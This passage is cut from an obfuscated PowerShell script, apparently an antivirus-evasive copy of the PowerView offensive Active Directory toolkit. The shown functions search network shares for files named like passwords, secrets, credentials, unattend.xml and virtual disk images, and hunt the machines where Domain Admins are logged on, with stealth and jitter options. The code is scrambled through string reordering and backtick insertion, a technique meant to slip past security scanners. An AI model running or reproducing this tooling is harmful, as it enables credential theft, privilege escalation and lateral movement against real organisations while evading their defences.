                &("{1}{3}{2}{0}"-f'e','W','bos','rite-Ver') ('['+'Ge'+'t'+'-WMI'+'Pro'+'cess] '+'Er'+'ror '+'enumer'+'a'+'t'+'ing '+'rem'+'ote '+'pro'+'c'+'esses '+'on'+' '+"'$Computer', "+'a'+'cc'+'ess '+'l'+'ik'+'ely '+'d'+'en'+'ied: '+"$_")
            }
        }
    }
}


function f`inD-iNtereSt`Ing`F`iLE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{3}{1}{0}{2}" -f 'ce','ldPro','ss','u','PSSho'}, '')]
    [OutputType({"{2}{3}{4}{1}{0}{5}"-f'oun','F','Power','View','.','dFile'})]
    [CmdletBinding(DEFAulTpARAMETERSetNAme = {"{2}{1}{5}{3}{0}{4}"-f'i','eSpec','Fil','at','on','ific'})]
    Param(
        [Parameter(posITiON = 0, vAluEfROMPiPelIne = ${T`Rue}, vaLUeFRoMpipEliNebyProPErtYNaME = ${Tr`UE})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pa`TH} = '.\',

        [Parameter(parameTERsEtnamE = "fIL`es`pEcif`icaTIon")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{2}{1}" -f'Sea','rms','chTe','r'}, {"{1}{0}"-f 's','Term'})]
        [String[]]
        ${InC`lU`de} = @(("{3}{1}{0}{2}" -f's','a','sword*','*p'), ("{1}{0}{2}{3}"-f 'i','*sens','ti','ve*'), ("{0}{2}{1}" -f '*ad','*','min'), ("{0}{1}" -f'*','login*'), ("{2}{0}{1}"-f'et','*','*secr'), ("{3}{4}{0}{2}{1}" -f'tend','.xml','*','una','t'), ("{1}{0}"-f 'mdk','*.v'), ("{0}{1}" -f '*','creds*'), ("{2}{0}{1}{3}"-f'cre','dent','*','ial*'), ("{1}{0}{2}"-f'.co','*','nfig')),

        [Parameter(PARaMeTersetNAmE = "fIl`esPeCiFi`CaTI`on")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${L`A`staccEssT`ime},

        [Parameter(pArAMEtErsetNAMe = "F`iLEs`peci`FiCaTIoN")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${l`AStWriTeTI`mE},

        [Parameter(PARaMeTerSEtname = "fILESPE`Cif`ic`AtiOn")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${cREaTI`oNt`imE},

        [Parameter(pArAMeTErsETNaME = "OFF`ic`eDoCs")]
        [Switch]
        ${oF`FICed`ocS},

        [Parameter(PARaMetERsEtNAmE = "FR`eS`heX`ES")]
        [Switch]
        ${FreS`hex`Es},

        [Parameter(parAMeteRSEtnaME = "Fil`E`SpEC`iFI`cation")]
        [Switch]
        ${eXCluD`e`F`OlDeRs},

        [Parameter(paRaMetErSetnamE = "f`il`ES`pECifI`CAtiOn")]
        [Switch]
        ${eXCl`UDeH`idDEN},

        [Switch]
        ${Ch`eCK`Write`ACcE`sS},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`ede`NtIaL} =  (  VARiABle ("{0}{1}" -f'qF','N')  )."V`ALue"::"em`PtY"
    )

    BEGIN {
        ${seaRCh`er`A`R`Gu`mENts} =  @{
            ("{1}{2}{0}" -f 'e','Recur','s') = ${TR`UE}
            ("{0}{2}{1}" -f'Erro','ction','rA') = ("{3}{0}{2}{1}"-f 'ilentlyC','ntinue','o','S')
            ("{2}{1}{0}" -f 'e','d','Inclu') = ${inCL`U`de}
        }
        if (${p`S`B`OUNdpAr`AMEtE`RS}[("{2}{0}{1}" -f 'ceDo','cs','Offi')]) {
            ${S`Ear`che`RarguMe`Nts}[("{1}{0}" -f 'de','Inclu')] = @(("{1}{0}"-f 'doc','*.'), ("{2}{0}{1}" -f'.','docx','*'), ("{1}{0}" -f's','*.xl'), ("{1}{0}" -f 'x','*.xls'), ("{0}{1}"-f '*','.ppt'), ("{1}{0}{2}" -f '.p','*','ptx'))
        }
        elseif (${psBOU`N`DP`ARa`MetErS}[("{1}{0}{2}" -f'XE','FreshE','s')]) {
            
            ${lAS`T`AC`CEsstIMe} = (&("{0}{2}{1}"-f 'Get','Date','-')).("{1}{0}"-f'Days','Add').Invoke(-7).("{1}{2}{0}"-f 'ring','T','oSt').Invoke(("{2}{0}{1}" -f'M/dd/','yyyy','M'))
            ${sEARC`h`er`ARg`UmeNTS}[("{0}{1}{2}" -f'I','nc','lude')] = @(("{0}{1}" -f '*','.exe'))
        }
        ${sE`ARc`heRargUmE`NTS}[("{1}{0}" -f'e','Forc')] = -not ${PS`B`O`UnDPAram`ETerS}[("{2}{3}{0}{4}{1}"-f'H','en','Exclu','de','idd')]

        ${m`Ap`PedCO`mPUters} = @{}

        function TeSt`-`wrITe {
            
            [CmdletBinding()]Param([String]${p`ATh})
            try {
                ${FI`lETEST} =  (  get-VaRIaBLE  ('vP'+'g') )."v`AluE"::("{1}{2}{0}" -f 'e','OpenWr','it').Invoke(${p`AtH})
                ${fiLe`Te`St}.("{1}{0}"-f'se','Clo').Invoke()
                ${TR`UE}
            }
            catch {
                ${Fa`l`SE}
            }
        }
    }

    PROCESS {
        ForEach (${t`A`RGETP`ATH} in ${Pa`TH}) {
            if ((${T`A`Rg`ETPath} -Match ((("{5}{4}{2}{6}{1}{0}{3}" -f'}{','.*{0','0}','0}.*','{','{0}','{0}{0}'))-f [Char]92)) -and (${PSBouN`d`ParA`metERS}[("{1}{0}{2}" -f'n','Crede','tial')])) {
                ${h`oSTC`o`MPuTEr} = (&("{2}{1}{0}"-f'ject','w-Ob','Ne') ("{0}{2}{1}"-f 'Sys','.Uri','tem')(${T`ArGeT`P`ATh}))."Ho`sT"
                if (-not ${M`APpedCOm`pu`TerS}[${hOs`Tc`omPuteR}]) {
                    
                    &("{3}{2}{1}{0}"-f'nnection','moteCo','dd-Re','A') -ComputerName ${HostcO`MpUT`er} -Credential ${c`Redent`I`AL}
                    ${mAPp`Ed`C`oMpUtE`RS}[${HoSTCOm`p`UTEr}] = ${tR`Ue}
                }
            }

            ${SEar`Chera`R`Gumen`TS}[("{0}{1}"-f 'Pat','h')] = ${T`A`RgETpaTh}
            &("{0}{3}{4}{2}{1}"-f 'Get','em','dIt','-','Chil') @SearcherArguments | &("{0}{1}{3}{4}{2}" -f'F','o','h-Object','rE','ac') {
                
                ${cO`NT`I`Nue} = ${T`RUe}
                if (${PsboUndp`A`RA`m`ETErs}[("{2}{4}{0}{3}{1}" -f 'eFold','rs','Exclu','e','d')] -and (${_}."PSi`sC`oNtAin`ER")) {
                    &("{2}{1}{0}"-f'ose','-Verb','Write') "Excluding: $($_.FullName) "
                    ${c`ONtinuE} = ${FA`l`sE}
                }
                if (${l`A`s`TAC`CesstIme} -and (${_}."LAST`A`ccESS`Time" -lt ${laStAC`C`E`s`STImE})) {
                    ${coNTIN`UE} = ${fal`SE}
                }
                if (${pS`Bo`U`NDParAmEters}[("{1}{2}{0}"-f'WriteTime','La','st')] -and (${_}."LASTw`Ri`Te`TiME" -lt ${La`S`Twr`ITeTiMe})) {
                    ${c`On`TINuE} = ${f`A`Lse}
                }
                if (${Psb`o`UnDparaM`EtERs}[("{2}{0}{1}"-f 'i','onTime','Creat')] -and (${_}."CREati`oNT`I`ME" -lt ${crEATIoN`Ti`ME})) {
                    ${cO`NtiN`Ue} = ${f`AL`Se}
                }
                if (${pSboUN`DPA`RA`ME`Te`Rs}[("{3}{1}{2}{0}"-f 'teAccess','eckW','ri','Ch')] -and (-not (&("{1}{2}{0}" -f'st-Write','T','e') -Path ${_}."f`UlLName"))) {
                    ${COnTi`N`UE} = ${f`ALse}
                }
                if (${CO`NTI`NUE}) {
                    ${fiLep`Ar`Ams} = @{
                        ("{0}{1}"-f'P','ath') = ${_}."fu`lLname"
                        ("{0}{1}"-f'Own','er') = $((&("{1}{0}" -f 'cl','Get-A') ${_}."Fu`LLNaMe")."O`wnER")
                        ("{0}{3}{2}{1}"-f 'La','ssTime','Acce','st') = ${_}."lAs`TAc`C`ESsTi`mE"
                        ("{3}{0}{4}{2}{1}" -f'a','teTime','Wri','L','st') = ${_}."lAs`TWRI`TetI`mE"
                        ("{2}{3}{1}{0}"-f 'e','tionTim','Cre','a') = ${_}."cR`eatIO`NTIme"
                        ("{1}{0}"-f 'th','Leng') = ${_}."l`e`Ngth"
                    }
                    ${f`Ou`NDfile} = &("{2}{1}{0}" -f 'ect','bj','New-O') -TypeName ("{2}{1}{0}" -f'ject','Ob','PS') -Property ${f`iLE`PArA`Ms}
                    ${F`ounD`FiLe}."P`so`BjEct"."typEnam`Es".("{0}{1}" -f'In','sert').Invoke(0, ("{4}{0}{5}{6}{3}{2}{1}"-f 'werView.F','e','l','dFi','Po','o','un'))
                    ${Fo`UNdf`i`Le}
                }
            }
        }
    }

    END {
        
        ${M`Ap`pe`dCOmpuTErs}."k`EYs" | &("{4}{5}{0}{3}{1}{2}" -f'ove-Remot','ec','tion','eConn','Re','m')
    }
}








function nEW-thrEadEDF`UN`c`T`iON {
    
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{7}{5}{9}{11}{6}{1}{8}{2}{12}{3}{10}{0}{4}"-f 'i','e','hangi','Fu','ons','hould','rStat','PSUseS','C','ProcessF','nct','o','ng'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(pOsitioN = 0, MAnDATOry = ${Tr`UE}, vALuEfrompIpelinE = ${tr`UE}, ValUEFROmPIpeliNeBYPrOPeRtYnaME = ${Tr`UE})]
        [String[]]
        ${co`MpUt`eRNA`ME},

        [Parameter(PosItion = 1, MANdatORy = ${t`RUE})]
        [System.Management.Automation.ScriptBlock]
        ${sC`RiPTBL`o`CK},

        [Parameter(POSitION = 2)]
        [Hashtable]
        ${sC`RIpt`PA`RaME`TE`Rs},

        [Int]
        [ValidateRange(1,  100)]
        ${Th`Re`ADS} = 20,

        [Switch]
        ${NO`iM`PORtS}
    )

    BEGIN {
        
        
        ${SEss`ionSt`Ate} =  (  VaRIABlE ("ou4"+"1")  -vALuE)::("{1}{2}{0}"-f'lt','Creat','eDefau').Invoke()

        
        
        ${s`e`ss`IONstATE}."aPaRtM`e`NtSTA`TE" =  ${H`kg}::"s`Ta"

        
        
        if (-not ${nO`i`mPOrts}) {
            
            ${M`YVa`RS} = &("{1}{0}{3}{2}" -f 'et-V','G','ble','aria') -Scope 2

            
            ${VOrBiD`d`eNVArs} = @('?',("{1}{0}"-f 's','arg'),("{0}{2}{3}{1}"-f'ConsoleF','me','ileN','a'),("{1}{0}" -f 'r','Erro'),("{1}{3}{2}{0}" -f'xt','Execut','Conte','ion'),("{0}{1}" -f'fal','se'),("{0}{1}" -f'HOM','E'),("{0}{1}"-f'Hos','t'),("{1}{0}"-f 'ut','inp'),("{1}{0}{2}{3}" -f'pu','In','t','Object'),("{0}{3}{2}{1}{4}" -f 'Max','u','mAliasCo','imu','nt'),("{4}{2}{3}{0}{1}"-f'o','unt','Driv','eC','Maximum'),("{2}{0}{1}{3}" -f'xi','mumEr','Ma','rorCount'),("{4}{1}{0}{5}{3}{2}" -f'xim','a','unt','ctionCo','M','umFun'),("{2}{0}{3}{4}{1}"-f 'ximum','ount','Ma','Hi','storyC'),("{0}{1}{3}{2}{4}" -f'M','aximumVa','iableCou','r','nt'),("{3}{0}{1}{2}"-f 'oca','tio','n','MyInv'),("{1}{0}" -f'ull','n'),'PID',("{2}{1}{0}{3}" -f'ram','ndPa','PSBou','eters'),("{2}{1}{0}{3}" -f 'Pa','d','PSComman','th'),("{1}{0}"-f'SCulture','P'),("{1}{0}{4}{3}{2}"-f 'SDefaultPa','P','alues','terV','rame'),("{0}{1}"-f 'PSHOM','E'),("{3}{1}{2}{0}" -f't','r','iptRoo','PSSc'),("{0}{2}{1}{3}" -f'PS','ul','UIC','ture'),("{3}{1}{0}{2}" -f'l','nTab','e','PSVersio'),'PWD',("{1}{0}" -f'Id','Shell'),("{2}{1}{3}{0}"-f'Hash','ynch','S','ronized'),("{0}{1}" -f'tr','ue'))

            
            ForEach (${v`Ar} in ${M`Y`VaRs}) {
                if (${VO`RB`IDd`E`NVARs} -NotContains ${V`Ar}."N`Ame") {
                ${Se`s`sio`NsTA`TE}."vAR`iAB`Les".("{1}{0}" -f'dd','A').Invoke((&("{0}{2}{1}"-f'New-Obje','t','c') -TypeName ("{3}{5}{2}{14}{1}{15}{4}{10}{11}{6}{8}{7}{9}{0}{13}{16}{12}{17}"-f'ssionState','t.Auto','g','System.Ma','a','na','sp','.S','aces','e','tion.','Run','e','Varia','emen','m','bl','Entry') -ArgumentList ${v`AR}."n`AmE",${V`Ar}."VAL`Ue",${v`Ar}."Desc`R`ipT`ioN",${V`Ar}."OP`T`iONS",${V`Ar}."ATt`R`Ibu`Tes"))
                }
            }

            
            ForEach (${F`Unc`TIon} in (&("{1}{3}{0}{2}"-f 't-ChildIt','G','em','e') ("{1}{0}{2}"-f'ctio','Fun','n:'))) {
                ${sE`SsioNSTA`TE}."cOm`maNds".("{1}{0}"-f 'dd','A').Invoke((&("{2}{0}{1}"-f 'O','bject','New-') -TypeName ("{10}{11}{0}{3}{4}{9}{1}{6}{7}{5}{8}{2}" -f'ment.A','Runsp','tionEntry','utomat','io','ssi','aces','.Se','onStateFunc','n.','Syste','m.Manage') -ArgumentList ${F`U`NctI`on}."na`me", ${fun`CTI`ON}."DE`FINI`Tion"))
            }
        }

        
        
        

        
        ${po`OL} =   ( vAriaBLe ("{0}{1}"-f'T7I','2')  -vA  )::("{3}{2}{0}{1}" -f 'eRunspac','ePool','reat','C').Invoke(1, ${THrE`AdS}, ${SeSSi`onsT`A`Te}, ${Ho`sT})
        ${Po`ol}.("{1}{0}"-f 'pen','O').Invoke()

        
        ${METH`oD} = ${N`ULl}
        ForEach (${M} in  ( Ls  ("Va"+"ri"+"AbLe:Jo361Q")  )."v`ALue".("{2}{0}{1}" -f 'e','thods','GetM').Invoke() | &("{1}{2}{0}{3}"-f're-O','W','he','bject') { ${_}."N`AME" -eq ("{3}{0}{1}{2}"-f'nInv','o','ke','Begi') }) {
            ${mET`hodpa`RAMe`TERs} = ${m}.("{0}{2}{1}{3}" -f 'G','a','etPar','meters').Invoke()
            if ((${MeT`h`OdPAR`AmeTE`RS}."cOu`NT" -eq 2) -and ${mE`ThOdpAR`AM`e`Te`RS}[0]."Na`Me" -eq ("{1}{0}"-f'put','in') -and ${mEt`HoDpaR`AmEt`E`RS}[1]."NA`me" -eq ("{1}{2}{0}" -f 't','o','utpu')) {
                ${MEt`h`Od} = ${m}."mAkEGEner`i`c`MetHOd"([Object], [Object])
                break
            }
        }

        ${j`OBs} = @()
        ${CompU`T`ErName} = ${c`OmP`UTeR`NAmE} | &("{2}{0}{1}" -f 'here-Obj','ect','W') {${_} -and ${_}.("{1}{0}"-f'im','Tr').Invoke()}
        &("{3}{2}{1}{0}"-f'se','o','Verb','Write-') "[New-ThreadedFunction] Total number of hosts: $($ComputerName.count) "

        
        if (${TH`RE`AdS} -ge ${cO`mputEr`NAMe}."L`eng`Th") {
            ${T`hr`EADs} = ${C`OM`PUTErNa`me}."l`Ength"
        }
        ${ElEmENtS`P`LiT`Si`Ze} = [Int](${co`m`pu`TeRNA`mE}."l`engTH"/${thRe`ADs})
        ${co`m`PuT`E`RnAmEPaRtiT`ionED} = @()
        ${S`TArT} = 0
        ${E`Nd} = ${elEMeNTs`Pli`TSi`ZE}

        for(${i} = 1; ${I} -le ${Th`RE`Ads}; ${i}++) {
            ${lI`ST} = &("{1}{2}{0}" -f'ct','New','-Obje') ("{0}{4}{3}{1}{5}{2}" -f'Syst','n','ist','.Collectio','em','s.ArrayL')
            if (${i} -eq ${th`Rea`ds}) {
                ${e`ND} = ${CoMPU`T`eRN`AMe}."l`ENgTH"
            }
            ${L`iST}."A`DDraN`GE"(${C`OMp`U`TERNAMe}[${s`TART}..(${E`ND}-1)])
            ${s`TArt} += ${ELeME`NTSpl`It`SIze}
            ${E`Nd} += ${E`LEm`e`NtSPLITsiZE}
            ${coM`Pu`TeRnAmEpArTIt`I`oNed} += @(,@(${L`Ist}.("{1}{0}"-f 'oArray','T').Invoke()))
        }

        &("{1}{2}{0}{3}{4}"-f 'ite-Verb','W','r','o','se') ('['+'New-Thr'+'eadedFunc'+'ti'+'on]'+' '+'To'+'t'+'al '+'numbe'+'r'+' '+'o'+'f '+'threa'+'ds/'+'part'+'itions'+': '+"$Threads")

        ForEach (${cOm`PUte`RNAm`ePa`RT`Iti`oN} in ${c`Om`PuteRnAMepaR`Ti`Ti`o`NED}) {
            
            ${poW`e`R`SHELl} =  ( GEt-VaRIabLE ("jo"+"361Q")  )."vAL`Ue"::("{0}{1}" -f 'Cre','ate').Invoke()
            ${Powe`RSHe`Ll}."rUnsPa`CE`pO`Ol" = ${po`ol}

            
            ${nU`lL} = ${pOwe`R`ShELl}.("{1}{0}{2}"-f'S','Add','cript').Invoke(${ScRI`Pt`B`locK}).("{2}{0}{1}{3}"-f'aram','et','AddP','er').Invoke(("{1}{2}{3}{0}"-f 'me','Co','mputerN','a'), ${c`OMp`UTER`N`A`me`PaRTitIon})
            if (${S`crI`ptpa`RaMEteRs}) {
                ForEach (${pAR`AM} in ${s`cri`PTPAR`AmET`E`RS}.("{1}{0}{2}"-f'umerat','GetEn','or').Invoke()) {
                    ${nU`Ll} = ${PO`W`ERSHElL}.("{0}{1}{2}{3}"-f 'A','d','d','Parameter').Invoke(${P`ARAm}."na`mE", ${P`AR`Am}."V`ALUE")
                }
            }

            
            ${O`Ut`pUT} = &("{2}{0}{1}"-f '-Obje','ct','New') ("{1}{9}{2}{11}{6}{8}{12}{3}{10}{5}{0}{7}{4}"-f '[Ob','Man','ent.Au','SDat','ct]','ollection','ti','je','o','agem','aC','toma','n.P')

            
            ${J`Obs} += @{
                ('PS') = ${Po`w`ErS`hell}
                ("{1}{2}{0}" -f 't','Outp','u') = ${o`U`TPuT}
                ("{1}{0}{2}" -f's','Re','ult') = ${ME`T`Hod}."I`N`VOkE"(${p`ow`eR`Shell}, @(${n`ULL}, [Management.Automation.PSDataCollection[Object]]${OUt`P`Ut}))
            }
        }
    }

    END {
        &("{2}{0}{3}{1}"-f 'r','se','Write-Ve','bo') ("{3}{8}{7}{0}{9}{4}{6}{1}{2}{5}"-f 'Functi','c','u','[New-Thread',' e','ting','xe','d','e','on] Threads')

        
        Do {
            ForEach (${J`OB} in ${jO`Bs}) {
                ${j`OB}."O`Utput".("{0}{1}{2}" -f'Re','a','dAll').Invoke()
            }
            &("{0}{1}{2}{3}"-f 'S','t','art','-Sleep') -Seconds 1
        }
        While ((${jO`BS} | &("{2}{3}{1}{0}" -f 'ject','e-Ob','Wh','er') { -not ${_}."ReSU`Lt"."isc`om`p`LeTed" })."CO`UnT" -gt 0)

        ${S`le`e`Pseco`Nds} = 100
        &("{1}{2}{0}{3}{4}" -f '-Ve','Writ','e','rbos','e') ('['+'New-Th'+'re'+'adedF'+'unct'+'ion] '+'Waiting'+' '+"$SleepSeconds "+'s'+'econ'+'ds '+'f'+'or '+'fin'+'a'+'l '+'cleanu'+'p..'+'.')

        
        for (${i}=0; ${I} -lt ${SLeEPS`Ec`ondS}; ${i}++) {
            ForEach (${j`oB} in ${jo`Bs}) {
                ${J`Ob}."o`UtpuT".("{0}{1}" -f'Read','All').Invoke()
                ${J`oB}."pS".("{0}{1}{2}"-f'Dis','po','se').Invoke()
            }
            &("{0}{1}{2}"-f 'Start-','Sle','ep') -S 1
        }

        ${PO`OL}.("{0}{1}" -f 'Dis','pose').Invoke()
        &("{0}{3}{2}{1}"-f'W','se','erbo','rite-V') ("{4}{1}{8}{6}{2}{3}{7}{5}{0}" -f'ted','-','nction] a','ll t','[New','comple','Fu','hreads ','Threaded')
    }
}


function find-dOmain`Us`ErlocA`TIon {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{4}{0}{3}"-f 'e','PS','ShouldPro','ss','c'}, '')]
    [OutputType({"{1}{4}{0}{3}{2}" -f 'rV','Pow','tion','iew.UserLoca','e'})]
    [CmdletBinding(dEfAUlTPARamETERsETnAME = {"{1}{2}{3}{0}"-f'y','UserG','roupIde','ntit'})]
    Param(
        [Parameter(POsITioN = 0, valUEfrOmPIpeLINe = ${t`RuE}, VAlUeFroMPIpelINeByPROperTynAme = ${T`RUE})]
        [Alias({"{2}{0}{1}"-f 'NSH','ostName','D'})]
        [String[]]
        ${C`OmPu`TeRna`me},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`o`MAIN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cOMPu`Te`Rd`oMAin},

        [ValidateNotNullOrEmpty()]
        [String]
        ${coMPu`TERL`dapF`i`lt`Er},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cO`M`pUt`ERSeaRCh`B`A`sE},

        [Alias({"{0}{2}{3}{1}{4}" -f 'U','n','nc','onstrai','ed'})]
        [Switch]
        ${coMPUterUn`cON`S`Tra`InED},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{2}{1}"-f 'O','m','gSyste','peratin'})]
        [String]
        ${cOm`p`U`T`ero`pERA`Ting`SYSTEm},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}{3}" -f 'ePac','Ser','vic','k'})]
        [String]
        ${coMP`UTERS`erViC`Epack},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'iteName','S'})]
        [String]
        ${coMPu`T`e`RsI`TeNamE},

        [Parameter(parAmEteRseTnAme = "u`Ser`iDENt`ity")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${U`se`RiDEN`Tity},

        [ValidateNotNullOrEmpty()]
        [String]
        ${us`e`Rdom`AIN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${uSer`LdApF`i`ltER},

        [ValidateNotNullOrEmpty()]
        [String]
        ${u`se`RSeArcHBase},

        [Parameter(paRAMEteRsETnaME = "us`e`RGRoU`PIdE`NTIty")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{3}{2}"-f 'upN','Gro','me','a'}, {"{1}{0}" -f'oup','Gr'})]
        [String[]]
        ${U`SERg`ROU`pIDenTITy} = ("{1}{0}{2}" -f'omain Admin','D','s'),

        [Alias({"{1}{0}{2}"-f'o','AdminC','unt'})]
        [Switch]
        ${uSE`RAd`MInCo`UnT},

        [Alias({"{1}{0}{2}{3}"-f'ow','All','D','elegation'})]
        [Switch]
        ${USEr`A`llOWdEL`EgAt`i`On},

        [Switch]
        ${c`H`EcKACcE`sS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{3}{0}{1}" -f 'troll','er','Domai','nCon'})]
        [String]
        ${S`ErVeR},

        [ValidateSet({"{1}{0}"-f'ase','B'}, {"{1}{0}"-f 'el','OneLev'}, {"{2}{0}{1}"-f'ubtre','e','S'})]
        [String]
        ${sE`AR`chScOpE} = ("{1}{0}"-f'ree','Subt'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`esULtpA`G`E`sIZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sERVErT`i`meLI`MIT},

        [Switch]
        ${toMb`S`TonE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`R`EDEntIAl} =   (  gI ("{0}{1}{2}{3}" -f'vaRIAB','Le:','Q','FN') )."Va`LUE"::"em`pty",

        [Switch]
        ${stoP`o`NsUCCEsS},

        [ValidateRange(1, 10000)]
        [Int]
        ${d`elaY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${jI`Tt`eR} = .3,

        [Parameter(paRAMeTersEtnAMe = "S`HoWAll")]
        [Switch]
        ${s`H`OwaLL},

        [Switch]
        ${sT`eALTh},

        [String]
        [ValidateSet('DFS', 'DC', {"{0}{1}" -f 'Fi','le'}, 'All')]
        ${sTEalt`hS`OUr`CE} = 'All',

        [Int]
        [ValidateRange(1, 100)]
        ${thR`eA`Ds} = 20
    )

    BEGIN {

        ${C`OmpUTeRs`eaRC`hERa`Rg`UmEnts} = @{
            ("{0}{3}{2}{1}"-f 'Pro','es','erti','p') = ("{0}{1}{2}" -f 'dnshos','tna','me')
        }
        if (${PsbounD`P`Ar`AME`T`ERs}[("{1}{0}" -f 'main','Do')]) { ${cOmPuTE`RSeaRcherA`RGUmE`N`TS}[("{1}{0}"-f 'in','Doma')] = ${dO`maiN} }
        if (${p`sboun`dP`ARaM`e`TERs}[("{3}{1}{2}{0}" -f'rDomain','om','pute','C')]) { ${COm`pu`TErs`ea`R`CHERA`R`gUmEN`TS}[("{0}{2}{1}" -f 'Do','in','ma')] = ${c`omputErdo`Ma`In} }
        if (${PsBo`Un`D`paRaM`EteRs}[("{1}{3}{2}{0}" -f 'er','Com','APFilt','puterLD')]) { ${coM`pUt`Ers`eARCHEr`ARGuMENTs}[("{2}{1}{0}"-f 'er','lt','LDAPFi')] = ${Com`pute`RldaPfi`lteR} }
        if (${psboU`N`d`p`ArAMeTers}[("{1}{2}{3}{0}" -f 'e','Com','puterSe','archBas')]) { ${c`oM`pUtERseArcH`ER`Ar`g`U`MENTs}[("{1}{2}{0}{3}" -f's','SearchB','a','e')] = ${C`oMpu`T`ErS`EarcHBA`Se} }
        if (${PSB`oUN`DP`A`RamETerS}[("{1}{3}{2}{0}"-f 'ined','Unco','a','nstr')]) { ${cOmPu`TERSEarCh`erAr`g`UmE`NtS}[("{3}{0}{2}{1}"-f 'c','ained','onstr','Un')] = ${uN`C`OnST`RaineD} }
        if (${PSBOUnD`pArAm`et`ers}[("{0}{2}{3}{1}" -f 'ComputerO','tingSystem','p','era')]) { ${cO`mpU`TERsEarcHERa`Rgu`m`EntS}[("{3}{2}{0}{1}" -f'gSy','stem','eratin','Op')] = ${opeR`A`Ting`SYS`TeM} }
        if (${p`SbOUn`dpar`AmetERS}[("{4}{3}{2}{1}{0}"-f'ck','erServicePa','t','ompu','C')]) { ${compu`TERseA`Rch`ERAR`GUmE`N`Ts}[("{0}{2}{1}"-f'S','icePack','erv')] = ${sERvI`C`EpAck} }
        if (${PSbouND`pa`RaM`E`TeRs}[("{2}{0}{3}{1}" -f 'omp','eName','C','uterSit')]) { ${cOmpUtE`R`sEa`R`CHE`RargUMeNts}[("{2}{1}{0}"-f 'me','iteNa','S')] = ${S`iten`AMe} }
        if (${pSBOuND`p`A`RaMET`ers}[("{1}{0}" -f 'r','Serve')]) { ${C`omP`Ut`er`SEArcH`e`RArgUmE`Nts}[("{1}{2}{0}"-f'r','Se','rve')] = ${sE`R`VEr} }
        if (${pSbo`UN`dparA`MeT`E`RS}[("{0}{2}{1}" -f 'Search','ope','Sc')]) { ${c`om`p`UTeRSeaRCHeraRguME`NTs}[("{1}{2}{0}" -f'chScope','S','ear')] = ${seA`RCH`Sc`ope} }
        if (${PsbOu`NDPArame`Te`Rs}[("{3}{4}{2}{1}{0}"-f'e','z','ageSi','Res','ultP')]) { ${COMP`U`TE`RSe`ARCherA`R`gU`m`enTs}[("{1}{0}{2}" -f 'ltPageSi','Resu','ze')] = ${rEsuLtP`A`ges`I`ze} }
        if (${p`SB`OUNDP`ARA`m`EtErS}[("{1}{2}{0}{3}" -f 'imi','ServerTim','eL','t')]) { ${c`om`pu`T`eR`sEaRcHerARGuMEnTs}[("{1}{4}{2}{0}{3}" -f 'Lim','Serve','Time','it','r')] = ${SEr`VeRTIMe`l`iMit} }
        if (${pSBouNDpAR`A`MET`E`Rs}[("{2}{0}{1}"-f 'ombst','one','T')]) { ${C`om`pUTERSEarche`RaRGu`MentS}[("{1}{0}{2}"-f't','Tombs','one')] = ${TO`mB`ST`onE} }
        if (${psbOu`NdPAR`A`MET`eRS}[("{2}{0}{1}"-f 're','dential','C')]) { ${c`Om`pUT`eRseaRCh`ERa`RGuM`E`NtS}[("{1}{0}{2}"-f 'ed','Cr','ential')] = ${C`REDe`Ntial} }

        ${uSErsE`A`R`cHer`Arg`UMeNTS} = @{
            ("{2}{3}{1}{0}" -f'es','rti','Pr','ope') = ("{2}{0}{1}"-f'ountna','me','samacc')
        }
        if (${p`SB`OunDpaRA`me`TeRs}[("{0}{1}{2}"-f 'User','Identi','ty')]) { ${u`SerseaRcH`eraR`G`UmEn`Ts}[("{1}{0}{2}" -f 'd','I','entity')] = ${USERiDe`Nt`itY} }
        if (${PSBO`UNd`p`ArAMeT`eRS}[("{1}{0}"-f 'ain','Dom')]) { ${u`ser`Se`ArcheraRg`UMeNTs}[("{1}{0}"-f 'omain','D')] = ${d`OMAiN} }
        if (${Ps`B`OUN`DPaRa`metE`Rs}[("{0}{3}{2}{1}"-f'Use','n','mai','rDo')]) { ${U`S`ErsE`A`Rch`eRar`GuMeNTs}[("{1}{2}{0}" -f'in','D','oma')] = ${use`R`DOMAin} }
        if (${P`sb`OUN`Dp`ARA`meTers}[("{2}{1}{0}{3}" -f't','Fil','UserLDAP','er')]) { ${uSERsEa`RchEraR`G`UmEn`Ts}[("{0}{1}{2}" -f 'LD','APFilte','r')] = ${uSERld`A`PfI`l`TEr} }
        if (${PSbOuNd`pA`RAM`E`T`ErS}[("{3}{0}{4}{2}{1}" -f 'erSea','e','s','Us','rchBa')]) { ${USE`Rs`e`A`RC`HeRA`RgUmENtS}[("{1}{0}{2}{3}" -f 'ea','S','rchBas','e')] = ${use`Rsea`Rch`BAse} }
        if (${p`sB`oUnDp`A`RAmE`TerS}[("{0}{3}{1}{2}" -f 'Use','nCou','nt','rAdmi')]) { ${usERSe`ARC`h`ERa`R`gumEnTS}[("{0}{2}{1}" -f 'A','inCount','dm')] = ${us`E`R`AdM`inCOUNt} }
